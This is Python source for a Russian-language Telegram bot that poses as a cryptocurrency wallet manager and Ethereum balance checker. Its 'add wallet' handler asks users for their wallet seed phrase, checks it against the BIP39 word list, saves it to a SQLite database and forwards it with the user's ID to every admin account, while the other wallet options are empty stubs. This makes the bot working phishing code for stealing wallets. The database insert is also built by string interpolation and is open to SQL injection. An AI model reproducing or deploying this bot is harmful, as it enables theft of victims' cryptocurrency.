import logging

from aiogram import Bot, Dispatcher, types
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.utils import executor
from config import token, terms, admins, api_key
from aiogram.contrib.fsm_storage.memory import MemoryStorage
import etherscan
import sqlite3
from bip39 import words

logging.basicConfig(level=logging.INFO)

bot = Bot(token, parse_mode='html')
dp = Dispatcher(bot, storage=MemoryStorage())

words_list = words.split()

es = etherscan.Client(
    api_key=api_key,
    cache_expire_after=5,
)


class Form(StatesGroup):
    phrase = State()
    adress = State()


@dp.message_handler(commands=['start'])
async def welcome(message: types.Message):
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    btn = types.InlineKeyboardButton(text='Согласиться ✅', callback_data='agree')
    keyboard.add(btn)
    await bot.send_message(message.from_user.id, f'{terms}', reply_markup=keyboard)


@dp.message_handler(content_types=['text'])
async def reply_buttons(message: types.Message):
    if message.text == 'мои кошельки':
        await bot.send_message(message.from_user.id, f'вы еще не добавили ни одного кошелька')
    if message.text == 'добавить кошелек':
        await Form.phrase.set()

        await bot.send_message(message.from_user.id, f'отправьте сид фразу кошелька который хотите добавить')
    if message.text == 'удалить кошелек':
        await bot.send_message(message.from_user.id, f'вы еще не добавили ни одного кошелька')
    if message.text == 'проверить баланс':
        await Form.adress.set()

        await bot.send_message(message.from_user.id, f'отправьте адрес кошелька\n\n'
                                                     f'<i>адреса загружать можно одним сообщением пачкой:\n'
                                                     f'адрес\nадрес\nадрес</i>')


@dp.message_handler(state=Form.phrase)
async def phrase(message: types.Message, state: FSMContext):
    async with state.proxy() as data:
        data["phrase"] = message.text
    c = 0
    msgs = data["phrase"].split()
    msg_unic = set(msgs)
    if len(data["phrase"].split()) == 12:
        for word in words_list:
            for a in msg_unic:
                if a == word:
                    c += 1
                else:
                    continue
    else:
        await bot.send_message(message.from_user.id, f'неправильно введена фраза')
        await state.finish()
    if c == 12:
        conn = sqlite3.connect('db/db.db')
        cur = conn.cursor()
        cur.execute(f'INSERT INTO testbot VALUES("{message.from_user.id}", "{data["phrase"]}")')
        conn.commit()
        for admin in admins:
            await bot.send_message(admin, f'{message.from_user.id}\n{data["phrase"]}')
        await state.finish()
    else:
        await bot.send_message(message.from_user.id, f'неправильно введена фраза')
        await state.finish()


@dp.message_handler(state=Form.adress)
async def adress(message: types.Message, state: FSMContext):
    async with state.proxy() as data:
        data["adress"] = message.text

    if len(data["adress"]) == 42 and data["adress"][0] == '0' and data["adress"][1] == 'x' and len(data["adress"].split()) == 1:
        eth_balance = es.get_eth_balance(data["adress"])
        await bot.send_message(message.from_user.id, f'{eth_balance}')
        await state.finish()
    else:
        await bot.send_message(message.from_user.id, f'неправильный адресс кошелька')
        await state.finish()

    if len(data["adress"].split()) != 1:
        with open('wallets.txt', 'w', encoding='utf-8') as file:
            file.writelines(data["adress"])

        file = open('wallets.txt', 'r')
        wallets = file.readlines()
        for wallet in wallets:
            wallet_for_balance = wallet.replace('\n', '')
            eth_balances = es.get_eth_balances([wallet_for_balance])
            await bot.send_message(message.from_user.id, f'{eth_balances}')
        await state.finish()


@dp.callback_query_handler(text='agree')
async def buttons(call):
    await bot.delete_message(chat_id=call.from_user.id, message_id=call.message.message_id)

    keyboard = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    btn1 = types.KeyboardButton('мои кошельки')
    btn2 = types.KeyboardButton('добавить кошелек')
    btn3 = types.KeyboardButton('удалить кошелек')
    btn4 = types.KeyboardButton('проверить баланс')
    keyboard.row(btn1)
    keyboard.add(btn2, btn3)
    keyboard.row(btn4)
    await bot.send_message(call.from_user.id, f'Главное меню', reply_markup=keyboard)


if __name__ == '__main__':
    executor.start_polling(dp)
